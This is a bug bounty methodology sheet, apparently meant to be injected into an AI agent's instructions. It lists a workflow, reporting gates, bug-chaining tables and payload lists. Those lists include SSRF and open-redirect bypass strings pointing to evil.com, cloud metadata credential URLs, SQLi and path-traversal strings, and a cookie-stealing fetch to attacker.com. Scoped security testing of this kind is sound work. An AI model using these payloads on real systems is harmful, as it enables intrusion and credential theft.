# BB-Hunter Full Methodology (claude-bug-bounty + bb-hunter)

Full skills from https://github.com/shuvonsec/claude-bug-bounty — inject into Strix instructions.

---

## PHASED WORKFLOW

```
Scope/Policy → Recon → Map Attack Surface → Proxy+Browser → Test by Type → Chain → Report
```

| Phase | Action |
|-------|--------|
| **Scope** | Read in-scope, out-of-scope, rate limits. One out-of-scope request = potential ban. |
| **Recon** | Subdomains, ports, URLs, APIs, tech stack. subfinder, httpx, katana, nuclei. |
| **Map** | Endpoints, parameters, roles. Annotated sitemap. Campaign scoring. |
| **Proxy+Browser** | Exercise every feature, every role. All traffic captured. |
| **Test** | Systematic by vuln class. Bypass tables below. Triage → confirm → exploit. |
| **Chain** | Every finding is a pivot. What does it unlock next? |
| **Report** | 7-Question Gate first. Then steps, impact, PoC. |

---

## 7-QUESTION GATE (Before ANY Report)

One wrong answer = KILL IT. Move on.

1. **Can attacker use RIGHT NOW?** Exact HTTP request, copy-paste ready. If not → KILL.
2. **Impact on program's accepted list?** Check exclusions. If excluded → KILL.
3. **In-scope asset?** Domain on list, production, not third-party. If not → KILL.
4. **Requires privileged access?** "Admin can do X" = KILL. "Non-admin does admin thing" = valid.
5. **Already known?** Search disclosed reports, changelog. If yes → KILL.
6. **Prove impact beyond "technically possible"?** XSS→cookie theft not alert(1). SSRF→internal data not DNS. IDOR→other user's data not 200. If not → DOWNGRADE.
7. **On NEVER SUBMIT list?** If yes without chain → KILL.

---

## 4 PRE-SUBMISSION GATES

ALL 4 must PASS.

**Gate 0 (30 sec):** Bug REAL, IN SCOPE, reproducible, evidence ready.
**Gate 1 (2 min):** "What can attacker DO?" Real victim, tangible impact.
**Gate 2 (5 min):** Searched Hacktivity, disclosed reports, changelog, Google.
**Gate 3 (10 min):** Title formula, copy-paste steps, evidence, severity, no "could potentially".

---

## NEVER SUBMIT LIST

Missing CSP/HSTS/headers, SPF/DKIM/DMARC, GraphQL introspection alone, banner disclosure without CVE, clickjacking non-sensitive, tabnabbing, CSV injection no RCE, CORS wildcard no exfil PoC, logout CSRF, self-XSS, open redirect alone, OAuth client_secret mobile, SSRF DNS-only, host header alone no reset PoC, rate limit non-critical, session not invalidated, concurrent sessions, internal IP error, mixed content, SSL weak ciphers, HttpOnly/Secure alone, broken links, autocomplete password, pre-ATO.

---

## CONDITIONALLY VALID — CHAIN REQUIRED

| Standalone | Chain To | Result |
|------------|----------|--------|
| Open redirect | OAuth redirect_uri → auth code theft | ATO Critical |
| CORS wildcard | Credentialed request exfils PII | High |
| CSRF | Sensitive action (transfer, delete) | High |
| SSRF DNS-only | Internal service + data returned | Medium |
| Host header injection | Password reset uses injected host | High |
| Self-XSS | CSRF triggers on victim | Medium |
| Subdomain takeover | OAuth redirect_uri at subdomain | Critical |
| GraphQL introspection | Auth bypass or IDOR on node() | High |

---

## BYPASS TABLES

### SSRF IP Bypass (11)
`2130706433` | `0177.0.0.1` | `0x7f.0x0.0x0.0x1` | `127.1` | `[::1]` | `[::ffff:127.0.0.1]` | DNS rebinding | Redirect chain | `attacker.com#@internal` | CNAME to internal | `[::ffff:0x7f000001]`

### Open Redirect (11, for OAuth)
`legit.com@evil.com` | `legit.com.evil.com` | `javascript:alert(1)` | `%252f%252fevil.com` | `legit.com\@evil.com` | `//evil.com` | `legit.com%00.evil.com` | Unicode IDN | `data:text/html,...` | `legit.com#@evil.com` | redirect_uri param

### File Upload (10)
Content-Type mismatch | .phtml .pHp .php5 .phar | shell.php.jpg | shell.php%00.jpg | Magic bytes | Polyglot | ../../../shell.php | Case .pHp | MIME sniffing

### IDOR (8)
V1: Numeric ID swap | V2: UUID enum | V3: Indirect (export?report_id=other) | V4: ?user_id=other | V5: Method swap (DELETE not PUT) | V6: Old API /v1/ | V7: GraphQL node(id) | V8: WebSocket userId

### Sibling Rule
If /api/admin/users has auth, test: /api/admin/export, /api/admin/delete, /api/admin/reset, /api/admin/oauth/*

### Cloud Metadata
AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
GCP: `http://metadata.google.internal/computeMetadata/v1/...` (Header: Metadata-Flavor: Google)
Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (Header: Metadata: true)

---

## HUNTING RULES (17)

1. READ FULL SCOPE FIRST
2. NEVER HUNT THEORETICAL BUGS
3. KILL WEAK FINDINGS FAST
4. CHECK SCOPE EXPLICITLY
5. 5-MINUTE RULE — nothing after 5 min → move on
6. AUTOMATION = RECON ONLY
7. IMPACT-FIRST
8. SIBLING RULE — if 9 endpoints have auth, check the 10th
9. A→B SIGNAL — confirming A = hunt B and C, time-box 20 min
10. DEPTH OVER BREADTH
11. NEW == UNREVIEWED — hunt new features first
12. FOLLOW THE MONEY — billing, credits, wallet
13. 20-MINUTE ROTATION — no progress → rotate
14. BUSINESS IMPACT > VULN CLASS
15. VALIDATE BEFORE WRITING
16. CHAIN FIRST when conditionally valid
17. REPORT QUALITY — title formula, evidence, no "could potentially"

---

## SECURITY ARSENAL (Payloads)

### XSS
`<script>alert(document.domain)</script>` | `<img src=x onerror=alert(1)>` | Cookie theft: `fetch('https://attacker.com?c='+document.cookie)` | CSP bypass: `{{constructor.constructor('alert(1)')()}}`

### SQLi
`'` | `' OR '1'='1` | `' UNION SELECT NULL--` | `'; SLEEP(5)--` | `/*!50000 SELECT*/` | Unicode apostrophe `ʼ`

### SSRF
Cloud metadata URLs above | `http://localhost:6379` (Redis) | `http://localhost:2375` (Docker)

### Path Traversal
`../../../etc/passwd` | `....//....//` | `..%2F..%2F` | `..%252f` | `%00.jpg` truncation

### IDOR
Change numeric ID | UUID enum | Method swap | Old API /v1/ | GraphQL node(id)

### JWT
alg:none | RS256→HS256 | Secret bruteforce

---

## CAMPAIGN SCORING

Test first: `/graphql` `/auth` `/admin` `/debug` (9) | `/api` `/upload` `/webhook` `/payment` (8) | `/user` `/search` `/export` `/invite` (7). +3 POST body, +2 query params, +2 versioned API.

---

## CHAIN THINKING

| Initial | Bridge | Impact |
|---------|--------|--------|
| Open Redirect | OAuth redirect_uri | ATO |
| SSRF | 169.254.169.254 metadata | RCE/Infra |
| XSS stored | Admin renders content | PrivEsc |
| IDOR | PII → password reset | ATO |
| Subdomain takeover | Cookies *.domain.com | Session hijack |
| Race | Payment/transfer flow | Financial |
| Info disclosure | Enables further attack | 10-20x multiplier |

Two mediums chained = critical = $5k-$50k.

---

## REPORT FORMAT

Title: `[Vuln Type] in [component] at [target] leads to [impact]`
Formula: `[Vuln] allows [attacker action] affecting [who], enabling [concrete impact].`
NEVER: "could potentially" or "may allow"
Include: Raw HTTP request AND response. Exact repro. Impact in business language.

---

## RATE LIMITS

Respect program limits (e.g. ≤10 req/s). No brute-force.
